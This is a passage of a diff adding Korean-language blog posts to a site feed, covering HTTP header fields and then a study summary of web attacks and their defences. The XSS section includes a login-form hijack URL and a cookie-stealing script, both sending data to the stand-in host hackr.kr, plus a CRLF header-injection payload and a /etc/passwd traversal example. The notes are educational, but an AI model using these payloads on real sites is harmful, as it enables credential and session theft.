+        &lt;ul&gt;
+          &lt;li&gt;필드 값의 단위는 초이다.&lt;/li&gt;
+          &lt;li&gt;프록시가 리스폰스를 생성했다면 Age 헤더 필드는 필수이다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;ETag : 리소스를 특정하기 위한 정보
+        &lt;ul&gt;
+          &lt;li&gt;entity tag라고 불리며, 서버는 리소스마다 ETag 값을 할당한다&lt;/li&gt;
+          &lt;li&gt;리소스가 갱신되면 ETag 값도 갱신할 필요가 있다&lt;/li&gt;
+          &lt;li&gt;ETag 값의 문자에는 특별히 룰이 정해져 있지 않고 서버에 따라 다양한 ETag 값을 할당한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Location : 클라이언트를 지정한 URI에 리다이렉트&lt;/li&gt;
+      &lt;li&gt;Proxy-Authenticate : 프록시 서버의 클라이언트 인증을 위한 정보&lt;/li&gt;
+      &lt;li&gt;Retry-After : Request 재시행의 타이밍 요구&lt;/li&gt;
+      &lt;li&gt;Server : HTTP 서버 정보&lt;/li&gt;
+      &lt;li&gt;Vary : 프록시 서버에 대한 캐시 관리 정보&lt;/li&gt;
+      &lt;li&gt;WWW-Authenticate : 서버의 클라이언트 인증을 위한 정보&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Entity Header Field
+    &lt;ul&gt;
+      &lt;li&gt;Allow : 리소스가 제공하는 HTTP 메소드&lt;/li&gt;
+      &lt;li&gt;Content-Encoding : 엔티티 바디에 적용되는 콘텐츠 인코딩&lt;/li&gt;
+      &lt;li&gt;Content-Language : 엔티티의 자연어&lt;/li&gt;
+      &lt;li&gt;Content-Length : 엔티티 바디의 사이즈 (단위 : 바이트)&lt;/li&gt;
+      &lt;li&gt;Content-Location :  리소스에 대응하는 대체 URL&lt;/li&gt;
+      &lt;li&gt;Content-MD5 : 엔티티 바디의 메시지 다이제스트&lt;/li&gt;
+      &lt;li&gt;Content-Range : 엔티티 바디의 범위 위치&lt;/li&gt;
+      &lt;li&gt;Content-Type : 엔티티 바디의 미디어 타입&lt;/li&gt;
+      &lt;li&gt;Expires : 엔티티 바디의 유효기한 날짜&lt;/li&gt;
+      &lt;li&gt;Last-Modified : 리소스의 최종 갱신 날짜&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;쿠키를 위한 헤더 필드
+    &lt;ul&gt;
+      &lt;li&gt;쿠키는 HTTP 1.1의 사양인 RFC2616에 포함된 것은 아니지만 웹 사이트에서 널리 사용되고 있다&lt;/li&gt;
+      &lt;li&gt;쿠키는 유저식별과 상태관리에 사용되고 있는 기능이다.&lt;/li&gt;
+      &lt;li&gt;쿠키가 호출되었을 때는 쿠키의 유효 기한과 송신자의 도메인, 경로, 프로토콜 등을 체크하는 것이 가능하기 때문에, 적절하게 발행된 쿠키는 다른 웹 사이트와 공격자의 공격에 의해 데이터가 도난당하는 일은 없다.&lt;/li&gt;
+      &lt;li&gt;쿠키를 위한 헤더 필드
+        &lt;ul&gt;
+          &lt;li&gt;Set-Cookie : 서버에서 쿠키전송을 위한 response 헤더필드
+            &lt;ul&gt;
+              &lt;li&gt;예시 : &lt;code&gt;Set-Cookie: status-enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.test.kr;&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;필드속성
+                &lt;ul&gt;
+                  &lt;li&gt;Name={Value} (쿠키에 부여된 이름과 값으로 필수이다)&lt;/li&gt;
+                  &lt;li&gt;Expires={DATE} (쿠키 유효기한으로 지정하지 않으면 브라우저를 닫을 때까지 이다)&lt;/li&gt;
+                  &lt;li&gt;Path={PATH} (쿠키 적용 대상이 되는 서버상의 디렉토리로 지정하지 않을 경우 도큐먼트와 같은 디렉토리가 된다. 이 지정을 피하는 방법이 있어서 보안효과는 기대할 수 없다)&lt;/li&gt;
+                  &lt;li&gt;Domain={도메인명} (예를들어 example.com로 지정했을 때 www.example.com이나 www2.example.com 등에서도 쿠키가 송출된다)&lt;/li&gt;
+                  &lt;li&gt;Secure (HTTPS로 통신하고 있는 경우에만 쿠키를 송신) &lt;/li&gt;
+                  &lt;li&gt;HttpOnly (쿠키를 Javascript에서 액세스하지 못하도록 제한)&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;Cookie : 서버에서 수신한 쿠키정보&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;이외의 헤더 필드
+    &lt;ul&gt;
+      &lt;li&gt;HTTP 헤더 필드는 독자적으로 확장할 수 있다.&lt;/li&gt;
+      &lt;li&gt;웹서버와 브라우저의 기능에 다양한 독자적 헤더필드가 존재한다&lt;/li&gt;
+      &lt;li&gt;그중에 자주 사용되는 헤더필드&lt;/li&gt;
+      &lt;li&gt;X-Frame-Option
+        &lt;ul&gt;
+          &lt;li&gt;다른 웹 사이트의 프레임에서 표시를 제어하는 HTTP Response Header로 Click jacking이라는 공격을 막는 것을 목적으로 한다.&lt;/li&gt;
+          &lt;li&gt;유효한 ㄴ브라우저는 익스8, 파폭3.6.9.+, 크롬 4.1+,  사파리4+, 오페라10.5+&lt;/li&gt;
+          &lt;li&gt;모든 웹 서버에서 설정해두는 것이 바람직하다&lt;/li&gt;
+          &lt;li&gt;apache2.conf 설정의 예
+            &lt;ul&gt;
+              &lt;li&gt;&lt;code&gt;&amp;lt;IfModule mod_headers.c&amp;gt;Header append X-FRAME-OPTIONS&quot;SAMEORIGIN&quot;&amp;lt;IfModule&amp;gt;&lt;/code&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;X-XSS-Protection
+        &lt;ul&gt;
+          &lt;li&gt;XSS의 대책으로서 브라우저의 XSS 보호 기능을 제어하는 HTTP Response Header&lt;/li&gt;
+          &lt;li&gt;0 : XSS 필터를 무효로 한다&lt;/li&gt;
+          &lt;li&gt;1 : XSS 필터를 유효로 한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;DNT
+        &lt;ul&gt;
+          &lt;li&gt;Do Not Track이라는 뜻이며 개인정보 수집을 거부하는 의사를 나타내는 HTTP Request Header이다.&lt;/li&gt;
+          &lt;li&gt;트래킹의 거부 의사를 나타내기 위한 방법 중 하나이다&lt;/li&gt;
+          &lt;li&gt;0 : 트래킹 동의&lt;/li&gt;
+          &lt;li&gt;1 : 트래킹 거부&lt;/li&gt;
+          &lt;li&gt;헤더 필드 기능이 유효성을 유지하기 위해서는 웹 서버에서 DNT를 지원해야 할 필요가 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;P3P&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</content>
+      </entry>
+      
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/08/28/보안</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/08/28/%EB%B3%B4%EC%95%88.html"/>
+        <title>Security</title>
+        <updated>2015-08-28T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/08/28/%EB%B3%B4%EC%95%88.html</uri>
+        </author>
+        <content type="html">&lt;h2 id=&quot;section&quot;&gt;&lt;em&gt;보안 학습공간&lt;/em&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;최신업데이트 일자  : 2015. 08. 30
+&lt;br /&gt;
+추가할 내용 : Salt, RSA, OAuth, HMAC, Form-based-Authentication 추가사항, Rest API 보안종류, 암호화 알고리즘, 디피힐만 키교환 알고리즘, 공인인증서 동작과정&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;근래에는 HTTPS가 의무화되면서 많은 곳에서 사용하고 있지만
+&lt;br /&gt;
+기술적으로도 보안을 위한 가장 표준적이고 쉬운방법으로 인식되고 있다.
+&lt;br /&gt;
+스터디 프로젝트를 진행하던 중, 
+&lt;br /&gt;
+HTTP 환경에서의 보안이슈에 대해 고민할 기회가 생겼고,
+&lt;br /&gt;
+개념정리를 겸해서 네트워크 암호화 기술에 대한 기록을 정리한다&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;next-2014-04&quot;&gt;보안스터디 (NEXT. 2014. 04)&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;FailToban : dos, ddos 공격을 막기 위한 서버용 소프트웨어&lt;/li&gt;
+  &lt;li&gt;Jmeter, Gatling : 서버 부하테스트 도구&lt;/li&gt;
+  &lt;li&gt;robot.txt 와 meta tag를 이용한 검색노출 제한&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/8wVg462j8vk1XJ&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
+&lt;div style=&quot;margin-bottom:5px&quot;&gt; &lt;strong&gt; &lt;a href=&quot;//www.slideshare.net/ssuserdaba75/robottxt-meta-tag&quot; title=&quot;robot.txt와 meta tag를 이용한 크롤링 설정&quot; target=&quot;_blank&quot;&gt;robot.txt와 meta tag를 이용한 크롤링 설정&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;//www.slideshare.net/ssuserdaba75&quot; target=&quot;_blank&quot;&gt;윤성 정&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;웹 공격기술&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;배경&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTP에는 보안 기능이 없다
+        &lt;ul&gt;
+          &lt;li&gt;SSH와 같은 프로토콜은 프로토콜 레벨에서 인증이나 세션관리의 기능이 준비되어 있다&lt;/li&gt;
+          &lt;li&gt;HTTP는 개발자가 설계하고 구현할 필요가 있다&lt;/li&gt;
+          &lt;li&gt;제각각이 설계하다보니 각기 다르게 구현되고 보안등급이 충분치 못하게 된다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Request는 클라이언트에서 변조가 가능하다
+        &lt;ul&gt;
+          &lt;li&gt;웹 어플리케이션이 브라우저로부터 수신한 HTTP 리퀘스트의 내용은 모든 클라이언트에서 자유롭게 변경/변조할 수 있다&lt;/li&gt;
+          &lt;li&gt;웹 어플리케이션에 대한 공격은 HTTP 리퀘스크 메시지에 공격코드를 실어서 실행된다. 쿼리나 폼, HTTP 헤더, 쿠키 등을 경유해서 보내져 웹 애플리케이션에 취약성이 있을 경우에는 정보를 도둑맞거나 권한을 빼앗기는 일이 발생한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;공격대상&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;HTTP를 사용하는 서버, 클라이언트&lt;/li&gt;
+      &lt;li&gt;서버 상에서 동작하는 웹 애플리케이션 등의 리소스&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;공격패턴&lt;/b&gt;&lt;/em&gt;
+    &lt;ul&gt;
+      &lt;li&gt;능동적 공격
+        &lt;ul&gt;
+          &lt;li&gt;서버를 노리는 능동적 공격&lt;/li&gt;
+          &lt;li&gt;공격자가 직접 웹 애플리케이션에 액세스해서 공격 코드를 보내는 타입의 방식&lt;/li&gt;
+          &lt;li&gt;서버 상의 리소스에 대해 직접 실행되기 때문에 공격자가 리소스에 액세스할 필요가 있다&lt;/li&gt;
+          &lt;li&gt;종류 : SQL Injection, OS Command Injection 등&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;수동적 공격
+        &lt;ul&gt;
+          &lt;li&gt;유저를 노리는 수동적 공격&lt;/li&gt;
+          &lt;li&gt;함정을 이용해서 유저에게 공격코드를 실행시키는 방식&lt;/li&gt;
+          &lt;li&gt;공격자가 직접 웹 애플리케이션에 액세스해서 공격하지 않는다&lt;/li&gt;
+          &lt;li&gt;수동적 공격을 이용하면 인트라넷 같은 인터넷에서 직접 액세스할 수 없는 네트워크를 공격할 수 있다&lt;/li&gt;
+          &lt;li&gt;일반적인 순서
+            &lt;ul&gt;
+              &lt;li&gt;공격자가 설치한 함정에 유저를 유도한다&lt;/li&gt;
+              &lt;li&gt;함정에는 공격 코드를 심어둔 HTTP Request를 발생시키기 위한 장치가 준비되어 있다&lt;/li&gt;
+              &lt;li&gt;사용자가 함정에 걸리면 유저의 브라우저나 메일 클라이언트에서 함정을 열게 된다&lt;/li&gt;
+              &lt;li&gt;함정에 걸리면 유저의 브라우저가 장착된 공격코드를 포함한 HTTP Request를 공격 대상인 웹 애플리케이션에 송신하고 공격코드를 실행한다&lt;/li&gt;
+              &lt;li&gt;공격코드를 실행하면 취약성이 있는 웹 애플리케이션을 경유한 결과로서 유저가 가지고 있는 쿠키 등의 기밀정보를 도둑맞거나 로그인 중인 유저의 권한이 악동되는 피해가 발생한다.&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;종류 : 크로스 사이트 스크립팅(XSS; Cross-site-Scripting), 크로스 사이트 리퀘스트 포저리 CSRF; Cross Site Request Forgery) 등&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;대표적인 공격 방법 1-1_출력 값의 이스케이프 미비로 인한 취약성 개괄&lt;/b&gt;&lt;/em&gt; (&lt;a href=&quot;https://msdn.microsoft.com/ko-kr/library/sbfk95yb(v=vs.110).aspx&quot;&gt;참고&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;웹 애플리케이션의 보안 대책을 실시하는 장소를 크게 나누면 다음과 같다&lt;/p&gt;
+
+  &lt;p&gt;1.클라이언트에서 체크&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;클라이언트 측에서의 체크는 대부분 Javascript를 사용한다&lt;/p&gt;
+
+    &lt;p&gt;변조되었거나 무효화될 가능성이 있기 때문에 근본적인 보안 대책으로는 적합하지 않다&lt;/p&gt;
+
+    &lt;p&gt;클라이언트 측의 체크는 입력 실수를 바로 지적해주는 UI향상을 위한 정도로 사용한다&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;2.웹 애플리케이션(서버측)에서 체크&lt;/p&gt;
+
+  &lt;blockquote&gt;
+    &lt;p&gt;2-1.입력값 체크&lt;/p&gt;
+
+    &lt;blockquote&gt;
+
+      &lt;p&gt;웹 애플리케이션 내에서 처리할 때에 공격코드로서 의미를 갖는 것도 있기 때문에 근본적인 보안 대책으로는 적합하지 않다.&lt;/p&gt;
+
+      &lt;p&gt;시스템 요건대로 된 값인지 아닌지에 대한 체크나 문자 코드의 체크 등을 실시한다&lt;/p&gt;
+
+    &lt;/blockquote&gt;
+
+    &lt;p&gt;2-2.출력값 체크&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;웹 애플리케이션에서 처리한 데이터를 데이터베이스나 파일 시스템, HTML, 메일 등에 출력할 때 출력하는 곳에 따라 값을 이스케이프 처리하는 것이 중요하다&lt;/p&gt;
+
+      &lt;p&gt;출력 값의 이스케이프가 미비할 경우 공격자가 보낸 공격코드가 출력하는 대상에 피해를 입힐 수 있다&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;&lt;b&gt;대표적인 공격 방법 1-2_출력 값의 이스케이프 미비로 인한 취약성 분류&lt;/b&gt;&lt;/em&gt;&lt;/p&gt;
+
+    &lt;ol&gt;
+      &lt;li&gt;크로스 사이트 스크립팅 (XSSl Cross-Site Scripting)
+        &lt;ul&gt;
+          &lt;li&gt;취약성이 있는 웹사이트를 방문한 사용자의 브라우저에서 부정한 HTML 태그나 Javascript 등을 동작시키는 공격이다. 동적으로 HTML을 생성하는 부분에서 취약성이 발생할 수 있다. 이는 공격자가 작성한 스크립트가 함정이 되고 유저의 브라우저 상에서 움직이는 수동적 공격이다&lt;/li&gt;
+          &lt;li&gt;영향
+            &lt;ul&gt;
+              &lt;li&gt;가짜 입력 폼 등에 의해 유저의 개인정보를 도둑맞는다&lt;/li&gt;
+              &lt;li&gt;스크립트에 의해 유저의 쿠키 값이 도둑맞거나 피해자가 의도하지 않는 리퀘스트가 송신된다&lt;/li&gt;
+              &lt;li&gt;가짜 문장이나 이미지 등이 표시된다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;공격사례
+            &lt;ul&gt;
+              &lt;li&gt;발생 장소는 동적으로 HTML을 생성하는 곳이다. 프로필 편집 기능을 예로 들 수 있다
+                &lt;ul&gt;
+                  &lt;li&gt;사용자가 입력한 내용이 그대로 다시 표시될 경우, 태그와 같은 영역을 입력값에 포함한다면 그 결과 데이터는 태그나 스크립트가 실행될 수 있다.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;http://test.kr/login?ID=yoon
+                &lt;ul&gt;
+                  &lt;li&gt;로그인창에 ID 파라미터에 대한 데이터를 넣어주는 형태로 구현되어있을 경우&lt;/li&gt;
+                  &lt;li&gt;XSS는 수동적 공격이기 때문에 공격자는 다음과 같은 메일이나 함정을 작성한 후 유저가 URL을 클릭하도록 유도한다.&lt;/li&gt;
+                  &lt;li&gt;&lt;code&gt;http://test.kr/login?ID=&quot;&amp;gt;&amp;lt;script&amp;gt;var+f=document.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.kr/pwget&quot;;+f.method=get;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+                  &lt;li&gt;URL을 열어도 보기에는 변함이 없지만 설치한 스크립트가 동작하고 있어 유저가 폼에 ID와 패스워드를 입력하면 공격자의 사이트인 hackr.kr로 입력데이터가 송신된다.&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;js파일을 호출하여 유저의 쿠키를 크로스 사이트 스크립팅으로 빼앗을 수 있다
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;code&gt;var content = escape(document.cookie)&lt;/code&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;code&gt;document.write(&quot;&amp;lt;img src=http://hackr.kr/?&lt;/code&gt;);&lt;/li&gt;
+                  &lt;li&gt;&lt;code&gt;document.write(content);&lt;/code&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;code&gt;document.write(&quot;&amp;gt;&quot;);&lt;/code&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;SQL Injection
+        &lt;ul&gt;
+          &lt;li&gt;웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격이다.&lt;/li&gt;
+          &lt;li&gt;커다란 위협을 일으킬 수 있는 취약성으로 개인정보나 기밀정보 누설로 직결되기도 한다&lt;/li&gt;
+          &lt;li&gt;만약에 SQL 호출 방법에 Validation 기능이 없으면 (Java의 Statement) 의도하지 않은 SQL문이 Inject되어 실행되는 경우가 있다&lt;/li&gt;
+          &lt;li&gt;영향
+            &lt;ul&gt;
+              &lt;li&gt;데이터베이스 내의 데이터 부정 열람이나 변조&lt;/li&gt;
+              &lt;li&gt;인증 회피&lt;/li&gt;
+              &lt;li&gt;데이터베이스 서버를 경유한 프로그램 실행 등&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;OS Command Injection
+        &lt;ul&gt;
+          &lt;li&gt;웹 애플리케이션을 경유하여 OS 명령을 부정하게 실행하는 공격&lt;/li&gt;
+          &lt;li&gt;쉘을 호출하는 함수가 있는 곳에서 발생할 가능성이 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;HTTP Header Injection
+        &lt;ul&gt;
+          &lt;li&gt;공격자가 Response Header 필드에 개행 문자 등을 삽입함으로써 임의의 Response Header Field나 Body를 추가하는 수동적 공격이다.&lt;/li&gt;
+          &lt;li&gt;특히 Body를 추가하는 공격을 HTTP Response Splitting Attack이라고 부른다&lt;/li&gt;
+          &lt;li&gt;영향
+            &lt;ul&gt;
+              &lt;li&gt;임의의 쿠키를 설정&lt;/li&gt;
+              &lt;li&gt;임의의 URL에 리다이렉트&lt;/li&gt;
+              &lt;li&gt;임의의 Body 표시 (Http Response Splitting Attack)&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;예시
+            &lt;ul&gt;
+              &lt;li&gt;Html Selector에 카테고리를 변경할 때마다 지정된 id값을 이용해 redirect 시키는 기능이 있다&lt;/li&gt;
+              &lt;li&gt;카테고리를 선택하면 Response에 &lt;code&gt;Location:주소/?category=101&lt;/code&gt; 와 같이 Location 헤더 필드 내에 그 값이 반영되어 리다이렉트 된다&lt;/li&gt;
+              &lt;li&gt;공격자는 카테고리 ID를 다음과 같이 고쳐서 Request를 보낸다 &lt;code&gt;101%0D%0ASet-Cookie:+SID=123456789&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;이때 Set-Cookie 헤더필드가 유효하기 때문에 공격자가 지정한 임의의 쿠키가 세팅되어 버린다. 이것은 Session Fixation이라는 공격자가 지정한 세션 ID를 사용하게 하는 공격으로서 유저로 위장할 가능성이 있다&lt;/li&gt;
+              &lt;li&gt;공격자가 입력한 &lt;code&gt;%0D%0A&lt;/code&gt;는 원래 Location헤더필드의 쿼리 값이 되어야 하지만 개행문자로 해석되어 버려 새로운 헤더필드가 추가되는 결과를 초래한다. 이로 인해 공격자는 임의의 헤더필드를 Response에 삽입할 수 있다.&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;HTTP Response Splitting Attack
+        &lt;ul&gt;
+          &lt;li&gt;앞서 기술된 공격자 입력값을 2개로 하여 개행문자를 두개 보낸다. HTTP 바디를 나누는 행을 만들어 내게 되니, Http Body 만들어낼 수 있다.&lt;/li&gt;
+          &lt;li&gt;함정에 빠진 유저의 브라우저에 가짜 웹 페이지를 표시해서 개인정보를 입력하게 하거나 XSS와 같은 효과를 얻을 수 있다&lt;/li&gt;
+          &lt;li&gt;HTTP/1.1의 복수 Response를 모아서 돌려보내는 기능을 악용해 캐시서버 등에 임의의 콘텐츠를 캐시하는 것도 가능하다. 이 공격을 캐시 오염이라고 부르기도 한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Mail Header Injection
+        &lt;ul&gt;
+          &lt;li&gt;웹 애플리케이션의 메일 송신 기능에 공격자가 임의의 To 및 Subject 등의 메일 헤더를 부정하게 추가하는 공격이다. 취약성이 있는 웹 사이트를 이용해서 스팸 메일이나 바이러스 메일 등을 임의의 주소에 송신할 수 있다&lt;/li&gt;
+          &lt;li&gt;문의하기와 같은 메일서비스를 제공하는 웹 어플리케이션 서비스에 공격자는 메일 주소로 계행을 나타내는 특수문자로 여러 메일을 추가하여 메일의 헤더 필드를 다시 쓰거나 본문에 첨부파일을 추가하는 것도 가능하다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;디렉토리 접근 공격 (Directory Traversal Attack)
+        &lt;ul&gt;
+          &lt;li&gt;웹 애플리케이션 파일을 조작하는 처리에서 파일이름을 외부에서 지정하는 처리가 취약할 경우 유저는 &lt;code&gt;../&lt;/code&gt; 등의 상대경로를 지정하거나 &lt;code&gt;/etc/passwd&lt;/code&gt;등의 절대 경로를 지정함으로써 임의의 파일이나 디렉토리에 액세스할 수 있다.&lt;/li&gt;
+          &lt;li&gt;이로인해 웹 서버상의 파일이 잘못 열람되거나 변조, 삭제될 수 있다&lt;/li&gt;
+          &lt;li&gt;임의의 파일이름을 지정할 수 없도록 해야 한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;리모트 파일 인클루션 (Remote File Inclusion)
+        &lt;ul&gt;
+          &lt;li&gt;스크립트의 일부를 다른 파일에서 읽어올 때 공격자가 지정한 외부 서버의 URL을 파일에서 읽게 함으로써 임의의 스크립트를 동작시키는 공격이다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;대표적인 공격 방법 2_웹 서버의 설정이나 설계 미비로 인한 취약성&lt;/b&gt;&lt;/em&gt;
+    &lt;ol&gt;
+      &lt;li&gt;강제 브라우징
+        &lt;ul&gt;
+          &lt;li&gt;웹 서버의 공개 디렉토리에 있는 파일 중에서 공개 의도가 없는 파일이 열람되게 되는 취약성&lt;/li&gt;
+          &lt;li&gt;예시
+            &lt;ul&gt;
+              &lt;li&gt;본문은 권한이 없어서 확인하지 못해도, 이미지는 URL을 통해 확인이 가능&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;영향
+            &lt;ul&gt;
+              &lt;li&gt;고객 정보 등 중요정보 유출&lt;/li&gt;
+              &lt;li&gt;액세스 권한이 있는 사용자에게만 표시되는 정보 유출&lt;/li&gt;
+              &lt;li&gt;어디에서도 링크되지 않은 파일 유출&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;부적절한 에러 메시지 처리
+        &lt;ul&gt;
+          &lt;li&gt;애플리케이션 에러 메시지를 통한 시스템 취약성을 노출&lt;/li&gt;
+          &lt;li&gt;상세한 에러 메세지는 공격자가 공격을 하기 위한 힌트가 될 수 있다&lt;/li&gt;
+          &lt;li&gt;예시
+            &lt;ul&gt;
+              &lt;li&gt;웹 애플리케이션에 의한 에러 메세지&lt;/li&gt;
+              &lt;li&gt;데이터베이스 등의 시스템에 의한 에러 메세지 (DB의 종류확인 가능)&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;메일주소가 등록되어 있지 않습니다&lt;/code&gt; 로 계정의 존재유무를 확인하는데 이용될 수 있다. 이는 부적절한 에러 메시지 처리의 취약성의 예시다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;해결방법
+            &lt;ul&gt;
+              &lt;li&gt;각 시스템의 설정에 의한 상세한 에러 메세지를 제한&lt;/li&gt;
+              &lt;li&gt;커스텀 에러 메세지를 이용
+&lt;br /&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;&lt;b&gt;대표적인 공격 방법 3_세션 관리 미비로 인한 취약성&lt;/b&gt;&lt;/em&gt;
+    &lt;ol&gt;
+      &lt;li&gt;Session Hijack
+        &lt;ul&gt;
+          &lt;li&gt;공격자가 유저의 세션 ID를 입수해서 악용하는 것으로, 유저로 위장하는 공격이다&lt;/li&gt;
+          &lt;li&gt;예방방법
+            &lt;ul&gt;
+              &lt;li&gt;주요데이터 변경등의 행위요청시 유저에서 인증절차를 다시한번 하게끔 한다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Session Fixation
+        &lt;ul&gt;
+          &lt;li&gt;공격자가 지정한 세션 ID를 유저에게 강제적으로 사용하게 하는 공격 (수동적 공격)&lt;/li&gt;
+          &lt;li&gt;예시
+            &lt;ul&gt;
+              &lt;li&gt;공격자가 로그인 페이지에 액세스해서 세션 ID를 발급받는다&lt;/li&gt;
+              &lt;li&gt;함정 URL을 준비해두고 유저를 유도해서 인증하도록 한다 (유저의 세션을 공격자 세션으로 강제한다)&lt;/li&gt;
+              &lt;li&gt;인증 후 공격자의 세션 ID의 상태가 유저인증 세션이 된다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
